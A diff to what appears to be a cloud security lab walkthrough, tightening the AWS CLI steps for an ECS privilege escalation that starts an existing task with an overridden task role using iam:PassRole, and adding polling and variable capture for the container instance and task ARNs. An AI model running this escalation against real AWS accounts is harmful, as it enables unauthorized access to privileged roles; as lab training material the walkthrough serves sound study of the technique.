@@ -42,17 +42,25 @@ aws ecs list-task-definitions --family-prefix pl-prod-ecs-009-existing-task
 
 The key insight here is that you do *not* need `ecs:RegisterTaskDefinition`. This task definition is already registered and waiting to be started. You only need to override its behavior at runtime.
 
-Retrieve the container instance ARN from the cluster — `ecs:StartTask` requires you to specify a `--container-instances` target, unlike `ecs:RunTask` which handles placement automatically:
+Retrieve the container instance ARN from the cluster — `ecs:StartTask` requires you to specify a `--container-instances` target, unlike `ecs:RunTask` which handles placement automatically.
+
+If `list-container-instances` returns `None` or an empty list, the container instance has not registered yet. The ECS-optimized EC2 instance registers with the cluster **asynchronously** after the lab deploys: its ECS agent has to boot and reach the ECS control plane, which usually takes a few minutes. Poll until the ARN appears, then save it in a variable so you can reuse it exactly as returned:
 
 ```bash
-aws ecs list-container-instances \
+until [ "$(aws ecs list-container-instances --cluster pl-prod-ecs-009-cluster --query 'containerInstanceArns[0]' --output text)" != "None" ]; do
+  echo "Container instance not registered yet; waiting 15s..."
+  sleep 15
+done
+
+CONTAINER_INSTANCE_ARN=$(aws ecs list-container-instances \
   --cluster pl-prod-ecs-009-cluster \
   --query 'containerInstanceArns[0]' \
-  --output text
+  --output text)
+echo "$CONTAINER_INSTANCE_ARN"
 # arn:aws:ecs:{region}:{account_id}:container-instance/pl-prod-ecs-009-cluster/{instance_id}
 ```
 
-Save this ARN — you need it for the exploit step.
+`$CONTAINER_INSTANCE_ARN` holds the **full** container instance ARN. You use it in the exploit step.
 
 ## Exploitation
 
@@ -78,11 +86,15 @@ OVERRIDES='{
   ]
 }'
 
-aws ecs start-task \
+TASK_ARN=$(aws ecs start-task \
   --cluster pl-prod-ecs-009-cluster \
   --task-definition pl-prod-ecs-009-existing-task \
-  --container-instances arn:aws:ecs:{region}:{account_id}:container-instance/pl-prod-ecs-009-cluster/{instance_id} \
-  --overrides "$OVERRIDES"
+  --container-instances "$CONTAINER_INSTANCE_ARN" \
+  --overrides "$OVERRIDES" \
+  --query 'tasks[0].taskArn' \
+  --output text)
+echo "$TASK_ARN"
+# arn:aws:ecs:{region}:{account_id}:task/pl-prod-ecs-009-cluster/{task_id}
 ```
 
 Two things happen simultaneously in this single API call:
@@ -92,12 +104,12 @@ Two things happen simultaneously in this single API call:
 
 The `iam:PassRole` permission is what makes the `taskRoleArn` override possible — without it, ECS would reject the request because you would be substituting a role you are not authorized to pass.
 
-Note the task ARN from the response and wait for the task to reach `STOPPED` status:
+The started task's ARN is now in `$TASK_ARN`. Wait for the task to reach `STOPPED` status:
 
 ```bash
 aws ecs describe-tasks \
   --cluster pl-prod-ecs-009-cluster \
-  --tasks {task_arn} \
+  --tasks "$TASK_ARN" \
   --query 'tasks[0].lastStatus' \
   --output text
 ```
